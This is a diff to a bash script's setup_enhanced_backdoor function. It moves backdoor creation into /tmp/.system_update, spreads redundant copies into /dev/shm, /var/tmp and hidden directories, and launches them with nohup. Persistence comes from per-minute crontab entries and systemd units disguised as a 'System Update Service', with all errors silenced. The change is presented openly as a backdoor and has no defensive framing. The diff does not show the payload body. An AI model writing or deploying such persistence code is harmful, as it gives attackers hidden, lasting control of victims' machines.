@@ -427,11 +427,7 @@ setup_enhanced_backdoor() {
     
     echo -e "${GREEN}Setting up enhanced backdoor persistence...${NC}"
     
-    for dir in "${HIDDEN_DIRS[@]}"; do
-        mkdir -p "$dir" 2>/dev/null
-        chmod 700 "$dir" 2>/dev/null
-        
-        # Create backdoor script with multiple fallback methods
+    # Create the backdoor script ONCE in /tmp
     cat > /tmp/.system_update << EOF
 #!/bin/bash
 while true; do
@@ -458,18 +454,24 @@ EOF
     
     chmod +x /tmp/.system_update
     
-    # Copy to the hidden directory for persistence
-    cp /tmp/.system_update "$dir/update.sh" 2>/dev/null
-    chmod +x "$dir/update.sh" 2>/dev/null
-    
     # Redundant copies
     cp /tmp/.system_update /dev/shm/.system_update 2>/dev/null
     cp /tmp/.system_update /var/tmp/.system_update 2>/dev/null
     chmod +x /dev/shm/.system_update 2>/dev/null
     chmod +x /var/tmp/.system_update 2>/dev/null
+    
+    # Execute one instance immediately
+    nohup /tmp/.system_update >/dev/null 2>&1 &
 
-    # Execute
-    nohup "$dir/update.sh" >/dev/null 2>&1 &
+    for dir in "${HIDDEN_DIRS[@]}"; do
+        mkdir -p "$dir" 2>/dev/null
+        chmod 700 "$dir" 2>/dev/null
+        
+        cp /tmp/.system_update "$dir/update.sh" 2>/dev/null
+        chmod +x "$dir/update.sh" 2>/dev/null
+        
+        # Execute persistence instance
+        nohup "$dir/update.sh" >/dev/null 2>&1 &
         
         if ! crontab -l 2>/dev/null | grep -q "$dir/update.sh"; then
             (crontab -l 2>/dev/null; echo "* * * * * $dir/update.sh >/dev/null 2>&1") | crontab - 2>/dev/null
@@ -478,23 +480,22 @@ EOF
         
         if [ -d /etc/systemd/system ]; then
             service_name="system-$(echo $dir | tr '/' '-' | sed 's/^-//')"
-            cat > "/etc/systemd/system/${service_name}.service" << EOF
+            cat > "/etc/systemd/system/${service_name}.service" << SERVICE_EOF
 [Unit]
 Description=System Update Service
 After=network.target
 
 [Service]
-Type=forking
 ExecStart=$dir/update.sh
 Restart=always
-RestartSec=10
+RestartSec=60
 
 [Install]
 WantedBy=multi-user.target
-EOF
-            systemctl daemon-reload 2>/dev/null
-            systemctl enable "${service_name}.service" 2>/dev/null
-            systemctl start "${service_name}.service" 2>/dev/null
+SERVICE_EOF
+            systemctl daemon-reload >/dev/null 2>&1
+            systemctl enable "${service_name}.service" >/dev/null 2>&1
+            systemctl start "${service_name}.service" >/dev/null 2>&1
         fi
     done
     
